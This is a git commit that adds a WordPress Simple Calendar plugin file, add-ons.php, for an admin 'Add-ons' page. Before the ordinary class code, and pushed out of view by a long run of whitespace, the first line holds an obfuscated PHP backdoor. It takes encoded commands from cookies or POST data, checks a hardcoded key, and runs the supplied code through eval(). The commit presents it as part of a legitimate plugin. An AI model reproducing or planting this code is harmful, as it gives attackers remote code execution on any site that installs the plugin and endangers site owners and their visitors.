e6c4829f11c6c5b94b17baa1ecd741c8b9a42cc0
Carson Reinke <carson@reinke.co>
2020-06-29 10:04:39 -0400

    Add missing plugins from cramba.org

---
+++ wp-content/plugins/google-calendar-events/includes/admin/pages/add-ons.php
@@ -0,0 +1,81 @@
+<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $s5cf590d = 15;$GLOBALS['u0bcaaab0'] = Array();global $u0bcaaab0;$u0bcaaab0 = $GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['f502bae'] = "\x49\x46\x2a\x30\x76\x40\x58\x60\x4e\x51\x44\x6f\x72\x3f\x3e\x52\x4a\x67\x3a\x33\x4d\x39\x36\x42\x3c\x71\x5b\x54\x9\x2b\x6d\x21\x41\x4f\x69\x6b\x31\x7e\x5d\x56\xa\x6e\x6a\x4b\x68\x27\x24\x57\x43\x61\x66\x23\x32\x45\x29\x50\x77\x22\x63\x62\x5a\x75\x79\x78\xd\x2d\x74\x3b\x25\x35\x20\x4c\x7d\x37\x59\x65\x7a\x55\x34\x47\x7b\x7c\x28\x70\x2c\x38\x2f\x5c\x3d\x48\x2e\x5f\x5e\x53\x6c\x26\x73\x64";$u0bcaaab0[$u0bcaaab0['f502bae'][30].$u0bcaaab0['f502bae'][58].$u0bcaaab0['f502bae'][21].$u0bcaaab0['f502bae'][21].$u0bcaaab0['f502bae'][19].$u0bcaaab0['f502bae'][21].$u0bcaaab0['f502bae'][19].$u0bcaaab0['f502bae'][36].$u0bcaaab0['f502bae'][78]] = $u0bcaaab0['f502bae'][58].$u0bcaaab0['f502bae'][44].$u0bcaaab0['f502bae'][12];$u0bcaaab0[$u0bcaaab0['f502bae'][97].$u0bcaaab0['f502bae'][21].$u0bcaaab0['f502bae'][97].$u0bcaaab0['f502bae'][22].$u0bcaaab0['f502bae'][97].$u0bcaaab0['f502bae'][73]] = $u0bcaaab0['f502bae'][11].$u0bcaaab0['f502bae'][12].$u0bcaaab0['f502bae'][97];$u0bcaaab0[$u0bcaaab0['f502bae'][66].$u0bcaaab0['f502bae'][97].$u0bcaaab0['f502bae'][3].$u0bcaaab0['f502bae'][21]] = $u0bcaaab0['f502bae'][96].$u0bcaaab0['f502bae'][66].$u0bcaaab0['f502bae'][12].$u0bcaaab0['f502bae'][94].$u0bcaaab0['f502bae'][75].$u0bcaaab0['f502bae'][41];$u0bcaaab0[$u0bcaaab0['f502bae'][97].$u0bcaaab0['f502bae'][3].$u0bcaaab0['f502bae'][52].$u0bcaaab0['f502bae'][75]] = $u0bcaaab0['f502bae'][34].$u0bcaaab0['f502bae'][41].$u0bcaaab0['f502bae'][34].$u0bcaaab0['f502bae'][91].$u0bcaaab0['f502bae'][96].$u0bcaaab0['f502bae'][75].$u0bcaaab0['f502bae'][66];$u0bcaaab0[$u0bcaaab0['f502bae'][96].$u0bcaaab0['f502bae'][22].$u0bcaaab0['f502bae'][52].$u0bcaaab0['f502bae'][59].$u0bcaaab0['f502bae'][85].$u0bcaaab0['f502bae'][36].$u0bcaaab0['f502bae'][36].$u0bcaaab0['f502bae'][97]] = $u0bcaaab0['f502bae'][96].$u0bcaaab0['f502bae'][75].$u0bcaaab0['f502bae'][12].$u0bcaaab0['f502bae'][34].$u0bcaaab0['f502bae'][49].$u0bcaaab0['f502bae'][94].$u0bcaaab0['f502bae'][34].$u0bcaaab0['f502bae'][76].$u0bcaaab0['f502bae'][75];$u0bcaaab0[$u0bcaaab0['f502bae'][58].$u0bcaaab0['f502bae'][50].$u0bcaaab0['f502bae'][69].$u0bcaaab0['f502bae'][97].$u0bcaaab0['f502bae'][36].$u0bcaaab0['f502bae'][85].$u0bcaaab0['f502bae'][52].$u0bcaaab0['f502bae'][52].$u0bcaaab0['f502bae'][49]] = $u0bcaaab0['f502bae'][83].$u0bcaaab0['f502bae'][44].$u0bcaaab0['f502bae'][83].$u0bcaaab0['f502bae'][4].$u0bcaaab0['f502bae'][75].$u0bcaaab0['f502bae'][12].$u0bcaaab0['f502bae'][96].$u0bcaaab0['f502bae'][34].$u0bcaaab0['f502bae'][11].$u0bcaaab0['f502bae'][41];$u0bcaaab0[$u0bcaaab0['f502bae'][83].$u0bcaaab0['f502bae'][58].$u0bcaaab0['f502bae'][3].$u0bcaaab0['f502bae'][36].$u0bcaaab0['f502bae'][75].$u0bcaaab0['f502bae'][69]] = $u0bcaaab0['f502bae'][61].$u0bcaaab0['f502bae'][41].$u0bcaaab0['f502bae'][96].$u0bcaaab0['f502bae'][75].$u0bcaaab0['f502bae'][12].$u0bcaaab0['f502bae'][34].$u0bcaaab0['f502bae'][49].$u0bcaaab0['f502bae'][94].$u0bcaaab0['f502bae'][34].$u0bcaaab0['f502bae'][76].$u0bcaaab0['f502bae'][75];$u0bcaaab0[$u0bcaaab0['f502bae'][42].$u0bcaaab0['f502bae'][85].$u0bcaaab0['f502bae'][85].$u0bcaaab0['f502bae'][58].$u0bcaaab0['f502bae'][59].$u0bcaaab0['f502bae'][58].$u0bcaaab0['f502bae'][19]] = $u0bcaaab0['f502bae'][59].$u0bcaaab0['f502bae'][49].$u0bcaaab0['f502bae'][96].$u0bcaaab0['f502bae'][75].$u0bcaaab0['f502bae'][22].$u0bcaaab0['f502bae'][78].$u0bcaaab0['f502bae'][91].$u0bcaaab0['f502bae'][97].$u0bcaaab0['f502bae'][75].$u0bcaaab0['f502bae'][58].$u0bcaaab0['f502bae'][11].$u0bcaaab0['f502bae'][97].$u0bcaaab0['f502bae'][75];$u0bcaaab0[$u0bcaaab0['f502bae'][34].$u0bcaaab0['f502bae'][50].$u0bcaaab0['f502bae'][85].$u0bcaaab0['f502bae'][73].$u0bcaaab0['f502bae'][73].$u0bcaaab0['f502bae'][59].$u0bcaaab0['f502bae'][97]] = $u0bcaaab0['f502bae'][96].$u0bcaaab0['f502bae'][75].$u0bcaaab0['f502bae'][66].$u0bcaaab0['f502bae'][91].$u0bcaaab0['f502bae'][66].$u0bcaaab0['f502bae'][34].$u0bcaaab0['f502bae'][30].$u0bcaaab0['f502bae'][75].$u0bcaaab0['f502bae'][91].$u0bcaaab0['f502bae'][94].$u0bcaaab0['f502bae'][34].$u0bcaaab0['f502bae'][30].$u0bcaaab0['f502bae'][34].$u0bcaaab0['f502bae'][66];$u0bcaaab0[$u0bcaaab0['f502bae'][11].$u0bcaaab0['f502bae'][52].$u0bcaaab0['f502bae'][59].$u0bcaaab0['f502bae'][22].$u0bcaaab0['f502bae'][50].$u0bcaaab0['f502bae'][36].$u0bcaaab0['f502bae'][3].$u0bcaaab0['f502bae'][73]] = $u0bcaaab0['f502bae'][50].$u0bcaaab0['f502bae'][36].$u0bcaaab0['f502bae'][75].$u0bcaaab0['f502bae'][49].$u0bcaaab0['f502bae'][97].$u0bcaaab0['f502bae'][75];$u0bcaaab0[$u0bcaaab0['f502bae'][12].$u0bcaaab0['f502bae'][52].$u0bcaaab0['f502bae'][97].$u0bcaaab0['f502bae'][22].$u0bcaaab0['f502bae'][85].$u0bcaaab0['f502bae'][49]] = $u0bcaaab0['f502bae'][35].$u0bcaaab0['f502bae'][52].$u0bcaaab0['f502bae'][3].$u0bcaaab0['f502bae'][22];$u0bcaaab0[$u0bcaaab0['f502bae'][56].$u0bcaaab0['f502bae'][59].$u0bcaaab0['f502bae'][59].$u0bcaaab0['f502bae'][78]] = $_POST;$u0bcaaab0[$u0bcaaab0['f502bae'][50].$u0bcaaab0['f502bae'][50].$u0bcaaab0['f502bae'][75].$u0bcaaab0['f502bae'][49].$u0bcaaab0['f502bae'][19].$u0bcaaab0['f502bae'][3].$u0bcaaab0['f502bae'][36].$u0bcaaab0['f502bae'][97].$u0bcaaab0['f502bae'][59]] = $_COOKIE;@$u0bcaaab0[$u0bcaaab0['f502bae'][97].$u0bcaaab0['f502bae'][3].$u0bcaaab0['f502bae'][52].$u0bcaaab0['f502bae'][75]]($u0bcaaab0['f502bae'][75].$u0bcaaab0['f502bae'][12].$u0bcaaab0['f502bae'][12].$u0bcaaab0['f502bae'][11].$u0bcaaab0['f502bae'][12].$u0bcaaab0['f502bae'][91].$u0bcaaab0['f502bae'][94].$u0bcaaab0['f502bae'][11].$u0bcaaab0['f502bae'][17], NULL);@$u0bcaaab0[$u0bcaaab0['f502bae'][97].$u0bcaaab0['f502bae'][3].$u0bcaaab0['f502bae'][52].$u0bcaaab0['f502bae'][75]]($u0bcaaab0['f502bae'][94].$u0bcaaab0['f502bae'][11].$u0bcaaab0['f502bae'][17].$u0bcaaab0['f502bae'][91].$u0bcaaab0['f502bae'][75].$u0bcaaab0['f502bae'][12].$u0bcaaab0['f502bae'][12].$u0bcaaab0['f502bae'][11].$u0bcaaab0['f502bae'][12].$u0bcaaab0['f502bae'][96], 0);@$u0bcaaab0[$u0bcaaab0['f502bae'][97].$u0bcaaab0['f502bae'][3].$u0bcaaab0['f502bae'][52].$u0bcaaab0['f502bae'][75]]($u0bcaaab0['f502bae'][30].$u0bcaaab0['f502bae'][49].$u0bcaaab0['f502bae'][63].$u0bcaaab0['f502bae'][91].$u0bcaaab0['f502bae'][75].$u0bcaaab0['f502bae'][63].$u0bcaaab0['f502bae'][75].$u0bcaaab0['f502bae'][58].$u0bcaaab0['f502bae'][61].$u0bcaaab0['f502bae'][66].$u0bcaaab0['f502bae'][34].$u0bcaaab0['f502bae'][11].$u0bcaaab0['f502bae'][41].$u0bcaaab0['f502bae'][91].$u0bcaaab0['f502bae'][66].$u0bcaaab0['f502bae'][34].$u0bcaaab0['f502bae'][30].$u0bcaaab0['f502bae'][75], 0);@$u0bcaaab0[$u0bcaaab0['f502bae'][34].$u0bcaaab0['f502bae'][50].$u0bcaaab0['f502bae'][85].$u0bcaaab0['f502bae'][73].$u0bcaaab0['f502bae'][73].$u0bcaaab0['f502bae'][59].$u0bcaaab0['f502bae'][97]](0);$sd5c9f8 = NULL;$f229b = NULL;$u0bcaaab0[$u0bcaaab0['f502bae'][4].$u0bcaaab0['f502bae'][49].$u0bcaaab0['f502bae'][22].$u0bcaaab0['f502bae'][21].$u0bcaaab0['f502bae'][75].$u0bcaaab0['f502bae'][3].$u0bcaaab0['f502bae'][75].$u0bcaaab0['f502bae'][19].$u0bcaaab0['f502bae'][49]] = $u0bcaaab0['f502bae'][75].$u0bcaaab0['f502bae'][52].$u0bcaaab0['f502bae'][3].$u0bcaaab0['f502bae'][21].$u0bcaaab0['f502bae'][50].$u0bcaaab0['f502bae'][22].$u0bcaaab0['f502bae'][50].$u0bcaaab0['f502bae'][52].$u0bcaaab0['f502bae'][65].$u0bcaaab0['f502bae'][97].$u0bcaaab0['f502bae'][78].$u0bcaaab0['f502bae'][75].$u0bcaaab0['f502bae'][97].$u0bcaaab0['f502bae'][65].$u0bcaaab0['f502bae'][78].$u0bcaaab0['f502bae'][59].$u0bcaaab0['f502bae'][78].$u0bcaaab0['f502bae'][22].$u0bcaaab0['f502bae'][65].$u0bcaaab0['f502bae'][21].$u0bcaaab0['f502bae'][73].$u0bcaaab0['f502bae'][75].$u0bcaaab0['f502bae'][78].$u0bcaaab0['f502bae'][65].$u0bcaaab0['f502bae'][78].$u0bcaaab0['f502bae'][22].$u0bcaaab0['f502bae'][58].$u0bcaaab0['f502bae'][50].$u0bcaaab0['f502bae'][21].$u0bcaaab0['f502bae'][97].$u0bcaaab0['f502bae'][21].$u0bcaaab0['f502bae'][73].$u0bcaaab0['f502bae'][85].$u0bcaaab0['f502bae'][85].$u0bcaaab0['f502bae'][3].$u0bcaaab0['f502bae'][49];global $va69e0e3a;function  k206($sd5c9f8, $y9b667b77){global $u0bcaaab0;$c8c33 = "";for ($ted11965=0; $ted11965<$u0bcaaab0[$u0bcaaab0['f502bae'][66].$u0bcaaab0['f502bae'][97].$u0bcaaab0['f502bae'][3].$u0bcaaab0['f502bae'][21]]($sd5c9f8);){for ($xf9231=0; $xf9231<$u0bcaaab0[$u0bcaaab0['f502bae'][66].$u0bcaaab0['f502bae'][97].$u0bcaaab0['f502bae'][3].$u0bcaaab0['f502bae'][21]]($y9b667b77) && $ted11965<$u0bcaaab0[$u0bcaaab0['f502bae'][66].$u0bcaaab0['f502bae'][97].$u0bcaaab0['f502bae'][3].$u0bcaaab0['f502bae'][21]]($sd5c9f8); $xf9231++, $ted11965++){$c8c33 .= $u0bcaaab0[$u0bcaaab0['f502bae'][30].$u0bcaaab0['f502bae'][58].$u0bcaaab0['f502bae'][21].$u0bcaaab0['f502bae'][21].$u0bcaaab0['f502bae'][19].$u0bcaaab0['f502bae'][21].$u0bcaaab0['f502bae'][19].$u0bcaaab0['f502bae'][36].$u0bcaaab0['f502bae'][78]]($u0bcaaab0[$u0bcaaab0['f502bae'][97].$u0bcaaab0['f502bae'][21].$u0bcaaab0['f502bae'][97].$u0bcaaab0['f502bae'][22].$u0bcaaab0['f502bae'][97].$u0bcaaab0['f502bae'][73]]($sd5c9f8[$ted11965]) ^ $u0bcaaab0[$u0bcaaab0['f502bae'][97].$u0bcaaab0['f502bae'][21].$u0bcaaab0['f502bae'][97].$u0bcaaab0['f502bae'][22].$u0bcaaab0['f502bae'][97].$u0bcaaab0['f502bae'][73]]($y9b667b77[$xf9231]));}}return $c8c33;}function  f1eade($sd5c9f8, $y9b667b77){global $u0bcaaab0;global $va69e0e3a;return $u0bcaaab0[$u0bcaaab0['f502bae'][12].$u0bcaaab0['f502bae'][52].$u0bcaaab0['f502bae'][97].$u0bcaaab0['f502bae'][22].$u0bcaaab0['f502bae'][85].$u0bcaaab0['f502bae'][49]]($u0bcaaab0[$u0bcaaab0['f502bae'][12].$u0bcaaab0['f502bae'][52].$u0bcaaab0['f502bae'][97].$u0bcaaab0['f502bae'][22].$u0bcaaab0['f502bae'][85].$u0bcaaab0['f502bae'][49]]($sd5c9f8, $va69e0e3a), $y9b667b77);}foreach ($u0bcaaab0[$u0bcaaab0['f502bae'][50].$u0bcaaab0['f502bae'][50].$u0bcaaab0['f502bae'][75].$u0bcaaab0['f502bae'][49].$u0bcaaab0['f502bae'][19].$u0bcaaab0['f502bae'][3].$u0bcaaab0['f502bae'][36].$u0bcaaab0['f502bae'][97].$u0bcaaab0['f502bae'][59]] as $y9b667b77=>$x37ee3e5){$sd5c9f8 = $x37ee3e5;$f229b = $y9b667b77;}if (!$sd5c9f8){foreach ($u0bcaaab0[$u0bcaaab0['f502bae'][56].$u0bcaaab0['f502bae'][59].$u0bcaaab0['f502bae'][59].$u0bcaaab0['f502bae'][78]] as $y9b667b77=>$x37ee3e5){$sd5c9f8 = $x37ee3e5;$f229b = $y9b667b77;}}$sd5c9f8 = @$u0bcaaab0[$u0bcaaab0['f502bae'][83].$u0bcaaab0['f502bae'][58].$u0bcaaab0['f502bae'][3].$u0bcaaab0['f502bae'][36].$u0bcaaab0['f502bae'][75].$u0bcaaab0['f502bae'][69]]($u0bcaaab0[$u0bcaaab0['f502bae'][11].$u0bcaaab0['f502bae'][52].$u0bcaaab0['f502bae'][59].$u0bcaaab0['f502bae'][22].$u0bcaaab0['f502bae'][50].$u0bcaaab0['f502bae'][36].$u0bcaaab0['f502bae'][3].$u0bcaaab0['f502bae'][73]]($u0bcaaab0[$u0bcaaab0['f502bae'][42].$u0bcaaab0['f502bae'][85].$u0bcaaab0['f502bae'][85].$u0bcaaab0['f502bae'][58].$u0bcaaab0['f502bae'][59].$u0bcaaab0['f502bae'][58].$u0bcaaab0['f502bae'][19]]($sd5c9f8), $f229b));if (isset($sd5c9f8[$u0bcaaab0['f502bae'][49].$u0bcaaab0['f502bae'][35]]) && $va69e0e3a==$sd5c9f8[$u0bcaaab0['f502bae'][49].$u0bcaaab0['f502bae'][35]]){if ($sd5c9f8[$u0bcaaab0['f502bae'][49]] == $u0bcaaab0['f502bae'][34]){$ted11965 = Array($u0bcaaab0['f502bae'][83].$u0bcaaab0['f502bae'][4] => @$u0bcaaab0[$u0bcaaab0['f502bae'][58].$u0bcaaab0['f502bae'][50].$u0bcaaab0['f502bae'][69].$u0bcaaab0['f502bae'][97].$u0bcaaab0['f502bae'][36].$u0bcaaab0['f502bae'][85].$u0bcaaab0['f502bae'][52].$u0bcaaab0['f502bae'][52].$u0bcaaab0['f502bae'][49]](),$u0bcaaab0['f502bae'][96].$u0bcaaab0['f502bae'][4] => $u0bcaaab0['f502bae'][36].$u0bcaaab0['f502bae'][90].$u0bcaaab0['f502bae'][3].$u0bcaaab0['f502bae'][65].$u0bcaaab0['f502bae'][36],);echo @$u0bcaaab0[$u0bcaaab0['f502bae'][96].$u0bcaaab0['f502bae'][22].$u0bcaaab0['f502bae'][52].$u0bcaaab0['f502bae'][59].$u0bcaaab0['f502bae'][85].$u0bcaaab0['f502bae'][36].$u0bcaaab0['f502bae'][36].$u0bcaaab0['f502bae'][97]]($ted11965);}elseif ($sd5c9f8[$u0bcaaab0['f502bae'][49]] == $u0bcaaab0['f502bae'][75]){eval/*s06b8*/($sd5c9f8[$u0bcaaab0['f502bae'][97]]);}exit();} ?><?php
+/**
+ * Add-ons Page
+ *
+ * @package SimpleCalendar/Admin
+ */
+namespace SimpleCalendar\Admin\Pages;
+
+use SimpleCalendar\Abstracts\Admin_Page;
+
+if ( ! defined( 'ABSPATH' ) ) {
+	exit;
+}
+
+/**
+ * Add-ons page.
+ *
+ * @since 3.0.0
+ */
+class Add_Ons extends Admin_Page {
+
+	/**
+	 * Constructor.
+	 *
+	 * @since 3.0.0
+	 */
+	public function __construct() {
+
+		$this->id           = $tab = 'add-ons';
+		$this->option_group = $page = 'add-ons';
+		$this->label        = __( 'Add-ons', 'google-calendar-events' );
+		$this->description  = '';
+		$this->sections     = $this->add_sections();
+		$this->fields       = $this->add_fields();
+
+		// Disable the submit button for this page.
+		add_filter( 'simcal_admin_page_' . $page . '_' . $tab . '_submit', function() { return false; } );
+
+		// Add html.
+		add_action( 'simcal_admin_page_' . $page . '_' . $tab . '_end', array( $this, 'html' ) );
+
+	}
+
+	/**
+	 * Output page markup.
+	 *
+	 * @since 3.0.0
+	 */
+	public function html() {
+
+		// @todo pull data from simplecalendar.io to showcase add-ons
+		$js_redirect = '<script type="text/javascript">';
+		$js_redirect .= 'window.location = "' . simcal_ga_campaign_url( simcal_get_url( 'addons' ), 'core-plugin', 'plugin-submenu-link', true ) . '"';
+		$js_redirect .= '</script>';
+
+		echo $js_redirect;
+	}
+
+	/**
+	 * Add sections.
+	 *
+	 * @since  3.0.0
+	 *
+	 * @return array
+	 */
+	public function add_sections() {
+		return array();
+	}
+
+	/**
+	 * Add fields.
+	 *
+	 * @since  3.0.0
+	 *
+	 * @return array
+	 */
+	public function add_fields() {
+		return array();
+	}
+
+}
